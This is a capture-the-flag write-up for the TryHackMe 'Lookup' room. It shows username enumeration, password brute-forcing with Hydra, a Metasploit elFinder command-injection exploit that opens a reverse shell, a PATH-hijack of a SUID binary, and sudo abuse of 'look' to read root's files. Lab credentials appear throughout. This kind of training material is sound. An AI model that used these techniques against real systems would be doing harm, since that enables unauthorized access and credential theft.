---

Name: Lookup
Difficulty: Easy
URL: https://tryhackme.com/room/lookup
Description: Test your enumeration skills on this boot-to-root machine.

---


## Enumeration

I started with a full port scan:

```bash
rustscan -a lookup.thm -r 1-65535 --ulimit 5000 -- -sC -sV
```

The scan found two open ports:

```text
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache httpd 2.4.41
```

Port 80 hosts a login page.

## Web Login

Trying a random username and password gives:

```text
Wrong username or password. Please try again.
```

However, trying `admin` with an incorrect password gives:

```text
Wrong password. Please try again.
```

This tells us that `admin` is a valid username.

I used Caido to brute-force the password for `admin`. Interestingly, `password123` produced a response with a different length, but logging in with it did not work.

This suggested that there might be another valid username.

I used the SecLists username wordlist:

```text
/seclists/Usernames/Names/names.txt
```

This revealed another valid username:

```text
jose
```

Brute-forcing the password for `jose` resulted in:

```text
jose:password123
```

This time, the credentials worked and redirected me to:

```text
files.lookup.thm
```

I added the hostname to `/etc/hosts` and visited the new site.

---

## File Enumeration

The site was running **elFinder** and contained several text files.

For example:

```text
test.txt

tipoff
dhabi
deriding
hoofer
```

and:

```text
administrator.txt

rycca
show-offs
overcast
packinghouse
```

I also found `credentials.txt` containing:

```text
think : nopassword
```

and `thislogin.txt` containing:

```text
jose : password123
```

The `think` credentials did not work directly for either the web login or SSH, so I continued enumerating the elFinder application.

---

## Exploiting elFinder

Since the application was running elFinder, I checked its version and searched for known vulnerabilities.

Nuclei identified the version:

```bash
nuclei -u http://files.lookup.thm/elFinder/ -tags tech
```

The relevant result was:

```text
[elfinder-version] [http] [critical] http://files.lookup.thm/elFinder/js/elfinder.min.js ["2.1.47"]
```

The server was running **elFinder 2.1.47**.

Searching for vulnerabilities revealed an elFinder PHP Connector `exiftran` command injection vulnerability.

I used the corresponding Metasploit module:

```text
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

I configured the target and reverse shell:

```text
set RHOSTS files.lookup.thm
set LHOST tun0
run
```

This gave me a shell as:

```text
www-data
```

---

## Privilege Escalation to `think`

From the `www-data` shell, I searched for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

The interesting result was:

```text
/usr/sbin/pwm
```

Running it normally:

```bash
/usr/sbin/pwm
```

gave:

```text
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

The program was executing the `id` command and using the returned username to determine which `.passwords` file to read.

The important detail is that it called `id` without specifying its full path.

### PATH Hijacking

I created a directory I could control:

```bash
mkdir /tmp/exploit
cd /tmp/exploit
```

Then I created a fake `id` executable:

```bash
cat > id <<'EOF'
#!/bin/bash
echo "uid=1000(think) gid=1000(think) groups=1000(think)"
EOF

chmod +x id
```

I placed this directory at the beginning of `$PATH`:

```bash
export PATH=/tmp/exploit:$PATH
```

Now, when `pwm` executes `id`, the shell finds my malicious `/tmp/exploit/id` before the legitimate `/usr/bin/id`.

Running `pwm` again:

```bash
/usr/sbin/pwm
```

resulted in:

```text
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
```

It then printed the contents of `think`'s password list:

```text
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
...
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.2856171
```

I saved these passwords to `passwords.txt`.

---

## SSH as `think`

I used Hydra to test the recovered password list against SSH:

```bash
hydra -l think -P passwords.txt ssh://lookup.thm
```

Hydra found valid credentials:

```text
login: think
password: josemario.AKA(think)
```

I could then SSH into the machine:

```bash
ssh think@lookup.thm
```

---

## Root

Once logged in as `think`, I checked the available sudo permissions:

```bash
sudo -l
```

The important result was:

```text
User think may run the following commands on ip-10-112-148-104:
    (ALL) /usr/bin/look
```

So `think` can execute `/usr/bin/look` as root.

`look` can be abused to read files. Checking [GTFOBins](https://gtfobins.org/gtfobins/look/#file-read) showed that it can be used to read arbitrary files with sudo.

I used:

```bash
sudo look '' /root/root.txt
```

This returned the contents of `/root/root.txt`.
